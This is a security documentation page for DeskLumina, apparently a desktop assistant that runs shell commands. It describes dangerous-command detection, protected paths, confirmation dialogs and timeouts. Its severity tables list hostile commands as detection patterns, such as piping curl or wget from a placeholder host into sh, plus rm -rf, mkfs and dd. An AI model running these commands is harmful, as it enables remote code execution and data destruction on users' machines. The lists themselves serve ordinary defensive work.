# 🔒 Security Documentation

Security features and protections in DeskLumina.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Dangerous Command Detection](#dangerous-command-detection)
- [Path Protection](#path-protection)
- [Confirmation System](#confirmation-system)
- [Timeout Protection](#timeout-protection)
- [Environment Security](#environment-security)
- [Error Handling](#error-handling)
- [Security Architecture](#security-architecture)

---

## 📖 Overview

DeskLumina implements multiple layers of security to protect your system from accidental or malicious operations.

### Security Layers

```
┌─────────────────────────────────────────────────────────────┐
│                    User Input                                │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Pattern Analysis (Dangerous Command Detection)    │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: Path Validation (Protected Path Detection)        │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: User Confirmation (Rofi Dialog)                   │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: Timeout Protection (30s limit)                    │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                    Command Execution                         │
└─────────────────────────────────────────────────────────────┘
```

---

## ⚠️ Dangerous Command Detection

### How It Works

Commands are analyzed against a pattern database before execution. Matching patterns trigger security responses based on severity.

**Location:** `src/constants/commands.ts`

### Severity Levels

| Level | Description | Action |
|-------|-------------|--------|
| **Critical** | System-destructive operations | Requires explicit confirmation |
| **High** | Potentially harmful operations | Requires confirmation |
| **Medium** | System-modifying operations | Logged and warned |
| **Safe** | Read-only operations | No restriction |

---

### Critical Severity Patterns

These patterns require explicit user confirmation:

| Pattern | Description | Example |
|---------|-------------|---------|
| `rm -rf` | Recursive deletion | `rm -rf /tmp/*` |
| `sudo` | Privilege escalation | `sudo apt update` |
| `shutdown` | System shutdown | `shutdown now` |
| `reboot` | System reboot | `reboot` |
| `poweroff` | Power off | `poweroff` |
| `halt` | System halt | `halt` |
| `mkfs` | Format filesystem | `mkfs.ext4 /dev/sda1` |
| `fdisk` | Disk partitioning | `fdisk /dev/sda` |
| `parted` | Partition editor | `parted /dev/sda` |
| `dd` | Low-level copy | `dd if=/dev/zero` |
| `curl \| sh` | Remote code execution | `curl http://x.com \| sh` |
| `wget \| sh` | Remote code execution | `wget http://x.com -O - \| sh` |
| `iptables -F` | Flush firewall | `iptables -F` |
| `update-grub` | Bootloader update | `update-grub` |

---

### High Severity Patterns

| Pattern | Description | Example |
|---------|-------------|---------|
| `rm` | File deletion | `rm file.txt` |
| `kill` | Process termination | `kill 1234` |
| `pkill` | Kill by name | `pkill firefox` |
| `killall` | Kill all by name | `killall chrome` |
| `systemctl stop` | Stop service | `systemctl stop ssh` |
| `systemctl restart` | Restart service | `systemctl restart nginx` |
| `chmod` | Change permissions | `chmod 777 file` |
| `chown` | Change ownership | `chown root file` |
| `mount` | Mount filesystem | `mount /dev/sda1 /mnt` |
| `umount` | Unmount filesystem | `umount /mnt` |

---

### Medium Severity Patterns

| Pattern | Description | Example |
|---------|-------------|---------|
| `cp` | File copying | `cp file /etc/` |
| `wget -o` | Download | `wget -o file http://x.com` |
| `curl -o` | Download | `curl -o file http://x.com` |
| `pip install` | Package install | `pip install package` |
| `npm install` | Package install | `npm install package` |
| `apt install` | Package install | `apt install vim` |
| `pacman -S` | Package install | `pacman -S firefox` |

---

### Safe Operations

Read-only operations that don't require confirmation:

- `ls`, `dir`, `tree` - List files
- `cat`, `head`, `tail` - Read files
- `grep`, `find` - Search
- `pwd`, `whoami`, `hostname` - System info
- `df`, `du`, `free` - Disk/memory info
- `ps`, `top`, `htop` - Process info

---

## 📁 Path Protection

### Protected Paths

Operations on these paths always require confirmation:

```typescript
const dangerousPaths = [
  "/", "/bin", "/boot", "/dev",
  "/etc", "/lib", "/root",
  "/sys", "/usr", "/var"
];
```

### Path Validation

**Location:** `src/tools/files.ts`

```typescript
function isDangerousPath(path: string): boolean {
  const expandedPath = expandTilde(path);
  const dangerous = ["/", "/bin", "/boot", "/dev", "/etc", "/lib", "/root", "/sys", "/usr", "/var"];
  return dangerous.some(d => expandedPath === d || expandedPath.startsWith(d + "/"));
}
```

### Examples

| Path | Status | Reason |
|------|--------|--------|
| `~/Documents` | ✅ Safe | User directory |
| `/home/user/file.txt` | ✅ Safe | User-owned path |
| `/etc/config` | ⚠️ Protected | System configuration |
| `/bin/bash` | ⚠️ Protected | System binary |
| `/` | ⚠️ Protected | Root filesystem |

---

## ✅ Confirmation System

### Rofi Confirmation Dialog

Dangerous operations trigger a graphical confirmation dialog.

**Location:** `src/security/confirmation.ts`

### Dialog Components

```
┌────────────────────────────────────────────┐
│  ⚠️  [Severity Icon] Operation Title       │
├────────────────────────────────────────────┤
│                                            │
│  Description of the operation              │
│                                            │
│  Command: rm -rf /tmp/cache                │
│                                            │
│  Danger Level: HIGH                        │
│                                            │
├────────────────────────────────────────────┤
│  [Cancel]                          [OK]    │
└────────────────────────────────────────────┘
```

### Severity Icons

| Severity | Icon | Color |
|----------|------|-------|
| Critical | ☢️ | Red |
| High | ⚠️ | Orange |
| Medium | ⚡ | Yellow |
| Safe | ✓ | Green |

### Confirmation Flow

```typescript
if (dangerous) {
  const confirmed = await rofiConfirm(
    "Operation Title",
    "Command details and warning",
    "high"  // severity
  );
  
  if (!confirmed) {
    return "❌ Operation cancelled by user";
  }
}
```

---

## ⏱️ Timeout Protection

### Command Timeout

All shell commands have a maximum execution time.

**Location:** `src/constants/commands.ts`

```typescript
export const COMMAND_TIMEOUT = 30000; // 30 seconds
```

### Timeout Handling

```typescript
const result = await execute(command, {
  timeout: COMMAND_TIMEOUT
});

if (result.timedOut) {
  return "❌ Command timed out after 30 seconds";
}
```

### Why 30 Seconds?

- Prevents hanging processes
- Protects against infinite loops
- Ensures responsive UI
- Most commands complete in <5 seconds

---

## 🔐 Environment Security

### API Key Storage

API keys are stored in `.env` file, never in code:

```bash
# .env (gitignored)
GROQ_API_KEY=gsk_xxxxxxxxxxxxx
MODEL_NAME=openai/gpt-oss-120b
```

### Environment Validation

**Location:** `src/config/env.ts`

```typescript
const GROQ_API_KEY = process.env.GROQ_API_KEY;
const MODEL_NAME = process.env.MODEL_NAME;

if (!GROQ_API_KEY || !MODEL_NAME) {
  throw new Error("Missing required environment variables");
}
```

### Git Safety

The `.env` file is excluded from version control:

```gitignore
# .gitignore
.env
```

---

## 🛡️ Error Handling

### Secure Error Messages

Errors are sanitized to prevent information leakage:

```typescript
try {
  const result = await execute(command);
  return result.stdout;
} catch (error) {
  // Sanitize error message
  const err = error instanceof Error ? error : new Error(String(error));
  logger.error("tool", `Failed: ${err.message}`);
  return `❌ Error: ${err.message}`;  // Generic message to user
}
```

### Error Logging

Detailed errors are logged securely:

- Full stack traces in log files only
- User sees sanitized messages
- No sensitive data in logs

---

## 🏗️ Security Architecture

### Module Responsibilities

| Module | Responsibility |
|--------|----------------|
| `dangerous-commands.ts` | Pattern database and analysis |
| `confirmation.ts` | User confirmation dialogs |
| `files.ts` | Path validation |
| `terminal.ts` | Command execution with timeout |
| `logger/` | Secure logging |

### Security Flow Example

```
User: "Delete the system folder"
         │
         ▼
┌─────────────────────────┐
│ 1. Pattern Analysis     │
│    - Contains "rm"      │◄── HIGH severity
│    - Contains "system"  │
└───────────┬─────────────┘
            │
            ▼
┌─────────────────────────┐
│ 2. Path Validation      │
│    - Path: /usr/local   │◄── PROTECTED
└───────────┬─────────────┘
            │
            ▼
┌─────────────────────────┐
│ 3. Confirmation Dialog  │
│    ⚠️ Delete Operation  │
│    Path: /usr/local     │
│    [Cancel] [OK]        │
└───────────┬─────────────┘
            │
            ▼
        User clicks Cancel
            │
            ▼
    ❌ Operation cancelled
```

---

## 📊 Security Checklist

Before executing any command:

- [ ] Pattern analysis completed
- [ ] Path validation passed
- [ ] User confirmation obtained (if needed)
- [ ] Timeout protection enabled
- [ ] Error handling in place
- [ ] Logging configured

---

## 🔗 Related Documentation

- [API Reference](./API.md) - Security module API
- [Development Guide](./DEVELOPMENT.md) - Secure coding practices
- [Tools Documentation](./TOOLS.md) - Tool-specific security

---

<div align="center">

**Security First!** Always verify commands before execution.

</div>
